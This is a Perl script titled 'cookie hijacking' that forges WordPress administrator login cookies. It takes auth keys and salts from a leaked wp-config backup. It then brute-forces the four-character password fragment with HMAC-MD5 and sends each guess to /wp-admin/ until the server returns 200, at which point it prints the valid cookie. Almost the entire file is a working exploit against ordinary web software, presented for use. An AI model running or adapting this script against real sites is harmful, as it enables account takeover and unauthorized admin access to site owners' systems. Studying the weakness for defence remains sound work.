#!/usr/bin/perl
#
# It's all started because I noticed
# that wp4 changed the login cookie
# and it happened to me to find in the net
# a wp-config.php.save [~ .swo .swp #emac#]
#
# @File wpcookie_hijacking.pl
# @Author tesla
# @Created 11-Oct-2014 04:08:30
#

use strict;
use Socket;
use Digest::MD5 qw(md5 md5_hex md5_base64);
use Digest::HMAC_MD5 qw(hmac_md5 hmac_md5_hex);

my $normal = "\033[0m";
my $red_b = "\033[1;31m";
my $green_b = "\033[1;32m";
my $blue_b = "\033[1;34m";
my $white_b = "\033[1;37m";
my $cnt = 0;
my $time_start = time;

print($white_b."\n"
  ."#################################################\n"
  ."#                                               #\n"
  ."# [cookie hijacking]                            #\n"
  ."#                                               #\n"
  ."# Generate WordPress login cookie               #\n"
  ."# and validate it on the fly                    #\n"
  ."#                                               #\n"
  ."#                                               #\n"
  ."# by Tesla                                      #\n"
  ."#                                               #\n"
  ."#################################################\n\n"
);

my $expiration = 1413749844;
my $domain = "localhost";
my $ip = "127.0.0.1";
my $user = 'admin';
my $auth_key = '';
my $auth_salt = '';
my $wordpress_ = 'wordpress_'.md5_hex('http://'.$domain);
my $wp_admin = '/wp-admin/';
my @frag = ('a'..'z', 'A'..'Z', '0'..'9', '/', '.');
my $proto = getprotobyname('tcp');
my $port = 80;
my($sock);

for(my $x = 0; $x < scalar @frag; $x++){
  for(my $z = 0; $z < scalar @frag; $z++){
    for(my $y = 0; $y < scalar @frag; $y++){
      for(my $w = 0; $w < scalar @frag; $w++){
        #only unique values
        if($x != $z && $x != $y && $x != $w){
          if($z != $y && $z != $w){
            if($y != $w){
              # wp-include/pluggable.php < wordpress 4:
              # 693 $pass_frag = substr($user->user_pass, 8, 4);
              my $pass_frag = @frag[$x].@frag[$z].@frag[$y].@frag[$w];
              # 1813 return hmac_md5('md5', $data, $salt);
              my $wpsalt = $auth_key.$auth_salt;
              # 695 $key = wp_hash($user->user_login . $pass_frag . '|' . $expiration, $scheme);
              my $key = hmac_md5_hex($user.$pass_frag.'|'.$expiration, $wpsalt);
              # 696 $hash = hmac_md5('md5', $user->user_login . '|' . $expiration, $key);
              my $hash = hmac_md5_hex($user.'|'.$expiration, $key);
              # 698 $cookie = $user->user_login . '|' . $expiration . '|' . $hash;
              my $wp_cookie = $user.'%7C'.$expiration.'%7C'.$hash;

              socket($sock, AF_INET, SOCK_STREAM, $proto) or die $red_b."socket() failed : $!\n".$normal;
              my $iaddr = inet_aton($ip) or die $red_b."Unable to resolve hostname : $ip\n".$normal;
              my $paddr = sockaddr_in($port, $iaddr);
              connect($sock, $paddr) or die $red_b."connect() failed : $!\n".$normal;
              send($sock, (my $get = Get($wordpress_, $wp_cookie)), 0)
                or die $red_b."send() failed : $!\n".$normal;
              my $http_code = <$sock>;
              if(index($http_code, '200') != -1){
                print($green_b."Found login cookie!\n"
                  .$white_b."$wordpress_=$wp_cookie\n\n"
                  .$blue_b."Packet n. $cnt of 15,249,024\n\n".$normal);
                close($sock);
                exit(0);
              }
              $cnt += 1;
              my $time_end = time;
              my $ten_min = $time_end - $time_start;
              if($ten_min >= '600'){
                $time_start = time;
                my $timestamp = localtime();
                print($blue_b."Packet n. $cnt of 15,249,024 ".$timestamp."\n");
              }
            }
          }
        }
      } # 64
    } # 4096
  } # 262144
} # 16777216
close($sock);

sub Get{
  my $wordpress_= shift;
  my $wp_cookie = shift;
  my $get = "GET $wp_admin HTTP/1.1\r\n"
    ."Host: $domain\r\n"
    ."User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0\r\n"
    ."Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    ."Accept-Language: en-US,en;q=0.5\r\n"
    ."Accept-Encoding: gzip, deflate\r\n"
    ."Connection: keep-alive\r\n"
    ."Cookie: $wordpress_=$wp_cookie\r\n\r\n";
  return $get;
}
exit(0);
